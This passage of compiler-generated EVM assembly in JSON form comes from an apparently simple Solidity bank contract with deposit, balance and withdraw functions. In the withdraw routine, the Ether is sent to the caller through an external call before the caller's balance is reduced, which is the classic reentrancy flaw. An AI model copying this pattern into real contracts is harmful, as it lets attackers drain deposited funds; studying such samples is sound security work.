											"begin": 338,
											"end": 378,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "tag",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 383,
											"end": 482,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 449,
											"end": 477,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 467,
											"end": 476,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 449,
											"end": 457,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 449,
											"end": 462,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 458,
											"end": 461,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 449,
											"end": 462,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 449,
											"end": 462,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 449,
											"end": 462,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 449,
											"end": 462,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 449,
											"end": 462,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 449,
											"end": 462,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 449,
											"end": 462,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 449,
											"end": 462,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 449,
											"end": 462,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 449,
											"end": 462,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 449,
											"end": 462,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 449,
											"end": 462,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 449,
											"end": 462,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 449,
											"end": 462,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 449,
											"end": 462,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 449,
											"end": 462,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 449,
											"end": 466,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 449,
											"end": 466,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 449,
											"end": 477,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 449,
											"end": 477,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 449,
											"end": 477,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 449,
											"end": 477,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 449,
											"end": 477,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 449,
											"end": 477,
											"name": "tag",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 449,
											"end": 477,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 433,
											"end": 441,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 433,
											"end": 446,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 442,
											"end": 445,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 433,
											"end": 446,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 433,
											"end": 446,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 433,
											"end": 446,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 433,
											"end": 446,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 433,
											"end": 446,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 433,
											"end": 446,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 433,
											"end": 446,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 433,
											"end": 446,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 433,
											"end": 446,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 433,
											"end": 446,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 433,
											"end": 446,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 433,
											"end": 446,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 433,
											"end": 446,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 433,
											"end": 446,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 433,
											"end": 446,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 433,
											"end": 477,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 433,
											"end": 477,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 433,
											"end": 477,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 433,
											"end": 477,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 590,
											"end": 824,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 662,
											"end": 669,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 638,
											"end": 646,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 638,
											"end": 658,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 647,
											"end": 657,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 638,
											"end": 658,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 638,
											"end": 658,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 638,
											"end": 658,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 638,
											"end": 658,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 638,
											"end": 658,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 638,
											"end": 658,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 638,
											"end": 658,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 638,
											"end": 658,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 638,
											"end": 658,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 638,
											"end": 658,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 638,
											"end": 658,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 638,
											"end": 658,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 638,
											"end": 658,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 638,
											"end": 658,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 638,
											"end": 658,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 638,
											"end": 658,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 638,
											"end": 669,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 635,
											"end": 820,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 635,
											"end": 820,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 680,
											"end": 691,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 696,
											"end": 706,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 696,
											"end": 711,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 696,
											"end": 711,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 718,
											"end": 725,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "tag",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "tag",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 696,
											"end": 730,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 696,
											"end": 730,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 679,
											"end": 730,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 679,
											"end": 730,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 679,
											"end": 730,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 806,
											"end": 813,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 782,
											"end": 790,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 782,
											"end": 802,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 791,
											"end": 801,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 782,
											"end": 802,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 782,
											"end": 802,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 782,
											"end": 802,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 782,
											"end": 802,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 782,
											"end": 802,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 782,
											"end": 802,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 782,
											"end": 802,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 782,
											"end": 802,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 782,
											"end": 802,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 782,
											"end": 802,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 782,
											"end": 802,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 782,
											"end": 802,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 782,
											"end": 802,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 782,
											"end": 802,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 782,
											"end": 802,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 782,
											"end": 802,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 782,
											"end": 813,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 782,
											"end": 813,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 782,
											"end": 813,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 782,
											"end": 813,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 782,
											"end": 813,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 782,
											"end": 813,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 782,
											"end": 813,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 782,
											"end": 813,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 782,
											"end": 813,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 782,
											"end": 813,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 782,
											"end": 813,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 635,
											"end": 820,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 635,
											"end": 820,
											"name": "tag",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 635,
											"end": 820,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 590,
											"end": 824,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 486,
											"end": 586,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 540,
											"end": 552,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 567,
											"end": 575,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 567,
											"end": 581,
